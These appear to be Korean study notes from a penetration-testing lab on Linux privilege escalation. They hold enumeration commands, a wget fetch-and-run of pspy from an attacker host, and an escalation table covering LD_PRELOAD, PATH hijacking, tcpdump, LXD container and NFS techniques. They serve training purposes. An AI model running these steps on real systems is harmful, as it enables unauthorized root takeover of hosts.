# 리눅스 권한 상승

Linux 시스템의 루트 계정은 운영 체제에 대한 전체 관리자 수준의 액세스 권한을 제공합니다. 평가 중에 Linux 호스트에서 낮은 권한의 셸을 확보하고 루트 계정으로 권한 상승을 수행해야 할 수 있습니다. 호스트를 완전히 손상시키면 트래픽을 캡처하고 민감한 파일에 액세스할 수 있으며, 이는 환경 내에서 추가 액세스에 사용될 수 있습니다. 또한 Linux 컴퓨터가 도메인에 가입되어 있는 경우 NTLM 해시를 획득하여 Active Directory를 열거하고 공격하기 시작할 수 있습니다.

## 열거

얻어야 할 정보

* `OS 버전`: 배포판(우분투, 데비안, FreeBSD, 페도라, 수세, 레드햇, 센트OS 등)을 알면 사용 가능한 도구의 유형을 파악할 수 있습니다. 또한 사용 가능한 공개 익스플로잇이 있을 수 있는 운영 체제 버전도 식별할 수 있습니다.
* `커널 버전`: OS 버전과 마찬가지로 특정 커널 버전의 취약점을 노리는 공개 익스플로잇이 있을 수 있습니다. .
* `실행 중인 서비스`: 호스트에서 실행 중인 서비스, 특히 루트로 실행 중인 서비스를 파악하는 것이 중요합니다.  Nagios, Exim, Samba, ProFTPd 등과 같은 많은 일반적인 서비스에서 결함이 발견되었습니다.&#x20;

```bash
//열거 명령어
ps aux | grep root #현재 프로세스 나열
ps au #현재 프로세스 나열
history #배시 기록
sudo -l #사용자 권한 나열
cat /etc/passwd #비밀번호 읽기
ls -la /etc/cron.daily/ #예약 작업 확인
lsblk #파일 시스템 및 추가 드라이브 읽기
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null #쓰기 가능한 디렉터리 찾기
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null #쓰기 가능한 파일 찾기
netstat -tnl #TCP 연결, ip주소와 포트 번호, 리스닝 상태 등 정보 표시 
 
```

### PSpy

다양한 정보 획득 가능&#x20;

```bash
//칼리리눅스에서 
python -m http.server 80

//침투컴퓨터에서
wget 10.10.14.47/pspy32
./pspy32 #권한문제로 안된다면 chmod 사용
```



| `ssh htb-student@<target IP>`                                                       | 실습 대상에 대한 SSH                  |
| ----------------------------------------------------------------------------------- | ------------------------------ |
|  `ps aux \| grep root`                                                              | 루트로 실행 중인 프로세스 보기              |
| `ps au`                                                                             | 로그인한 사용자 보기                    |
| `ls /home`                                                                          | 사용자 홈 디렉터리 보기                  |
| `ls -l ~/.ssh`                                                                      | 현재 사용자의 SSH 키 확인               |
| `history`                                                                           | 현재 사용자의 Bash 기록 확인             |
| `sudo -l`                                                                           | 사용자가 다른 사용자로서 무엇이든 실행할 수 있습니까? |
| `ls -la /etc/cron.daily`                                                            | 일일 Cron 작업 확인                  |
| `lsblk`                                                                             | 마운트 해제된 파일 시스템/드라이브 확인         |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`                       | 세계적으로 쓰기 가능한 디렉토리 찾기           |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`                       | 누구나 쓰기 가능한 파일 찾기               |
| `uname -a`                                                                          | 커널 버전 확인                       |
| `cat /etc/lsb-release`                                                              | OS 버전 확인                       |
| `gcc kernel_expoit.c -o kernel_expoit`                                              | C로 작성된 익스플로잇 컴파일               |
| `screen -v`                                                                         | 설치된 버전을 확인하세요.`Screen`         |
| `./pspy64 -pf -i 1000`                                                              | 다음을 사용하여 실행 중인 프로세스 보기`pspy`   |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`                     | SUID 비트가 설정된 바이너리 찾기           |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`                     | SETGID 비트가 설정된 바이너리 찾기         |
| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | 개인 esc`tcpdump`                |
| `echo $PATH`                                                                        | 현재 사용자의 PATH 변수 내용을 확인하세요.     |
| `PATH=.:${PATH}`                                                                    | `.`현재 사용자의 PATH 시작 부분에 추가      |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`                   | 구성 파일 검색                       |
| `ldd /bin/ls`                                                                       | 바이너리에 필요한 공유 객체 보기             |
| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart`                            | 다음을 사용하여 권한 에스컬레이션`LD_PRELOAD` |
| `readelf -d payroll \| grep PATH`                                                   | 바이너리의 RUNPATH를 확인하세요.          |
| `gcc src.c -fPIC -shared -o /development/libshared.so`                              | 공유 라이브러리를 컴파일했습니다.             |
| `lxd init`                                                                          | LXD 초기화 프로세스 시작                |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`                  | 로컬 이미지 가져오기                    |
| `lxc init alpine r00t -c security.privileged=true`                                  | 권한 있는 LXD 컨테이너 시작              |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`      | 컨테이너에 호스트 파일 시스템 마운트           |
| `lxc start r00t`                                                                    | 컨테이너 시작                        |
| `showmount -e 10.129.2.12`                                                          | NFS 내보내기 목록 표시                 |
| `sudo mount -t nfs 10.129.2.12:/tmp /mnt`                                           | NFS 공유를 로컬로 탑재                 |
| `tmux -S /shareds new -s debugsess`                                                 | 공유 `tmux`세션 소켓을 만들었습니다.        |
| `./lynis audit system`                                                              | 다음을 사용하여 시스템 감사를 수행합니다.`Lynis` |
